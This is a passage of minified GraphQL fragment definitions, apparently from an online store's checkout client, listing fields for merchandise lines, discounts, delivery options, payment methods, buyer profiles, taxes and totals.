__typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{... on MerchandisePropertyValueString{string:value __typename}... on MerchandisePropertyValueInt{int:value __typename}... on MerchandisePropertyValueFloat{float:value __typename}... on MerchandisePropertyValueBoolean{boolean:value __typename}... on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{... on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}... on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}... on DiscountCodeTrigger{code __typename}... on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{... on FilledBuyerIdentityTerms{email phone customer{... on CustomerProfile{email __typename}... on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{... on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{... on RetailAttributions{deviceId locationId userId __typename}... on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{... on SaleAttribution{recipient{... on StaffMember{id __typename}... on Location{id __typename}... on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment... on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename... on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{... on DiscountAllocatedAllocationSet{__typename allocations{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename... on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{... on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}... on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{... on CompleteDeliveryStrategy{handle __typename}... on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{... on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{... on IntIntervalConstraint{lowerBound upperBound __typename}... on IntValueConstraint{value __typename}__typename}amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{... on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}... on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{... on MerchandiseLine{stableId quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}... on MerchandiseBundleLineComponent{stableId quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}... on MerchandiseLineComponentWithCapabilities{stableId quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{... on SourceProvidedMerchandise{__typename requiresShipping}... on ProductVariantMerchandise{__typename requiresShipping}... on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}... on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{... on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{... on LineComponentDiscountAllocation{allocation{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{... on PendingTerms{taskId pollDelay __typename}... on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{... on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{... on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}... on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{... on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{... on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{... on IntIntervalConstraint{lowerBound upperBound __typename}... on IntValueConstraint{value __typename}__typename}amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{... on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}... on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}__typename}payment{... on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{... on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}... on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}... on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}... on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename... on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}... on WalletsPlatformConfiguration{name configurationParams __typename}... on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}... on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}... on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}... on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}... on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}... on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}... on AmazonPayClassicWalletConfig{__typename name orderingIndex}... on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{... on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}... on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}... on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}... on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}... on DeferredPaymentMethod{orderingIndex displayName __typename}... on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}... on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{... on DepositPercentage{percentage __typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}poNumber merchandise{... on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{... on FilledBuyerIdentityTerms{customer{... on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}... on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}... on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{... on SMSMarketingConsent{value __typename}... on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{... on FilledDutyTerms{totalDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}tax{... on FilledTaxTerms{totalTaxAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{... on TargetAllLines{__typename}__typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}tip{tipSuggestions{... on TipSuggestion{__typename percentage amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{... on FilledTipTerms{tipLines{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{... on LocalizationExtension{fields{... on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{... on RetailAttributions{deviceId locationId userId __typename}... on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{... on SaleAttribution{recipient{... on StaffMember{id __typename}... on Location{id __typename}... on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment... on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{... on Captcha{provider challenge sitekey token __typename}... on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{... on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{... on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename... on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{... on ShopCashRedemptionContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}... on StoreCreditRedemptionContent{storeCreditAccountId __typename}... on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{... on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{... on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}... on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}... on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}... on WalletsPlatformPaymentMethod{name walletParams __typename}... on WalletPaymentMethod{name walletContent{... on ShopPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}... on PaypalWalletContent{paypalBillingAddress:billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}... on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}... on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}... on FacebookPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}... on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}... on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{... on IdealPaymentMethodParameters{bank __typename}__typename}__typename}... on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}... on OffsitePaymentMethod{paymentMethodIdentifier name __typename}... on CustomPaymentMethod{id name additionalDetails paymentInstructions 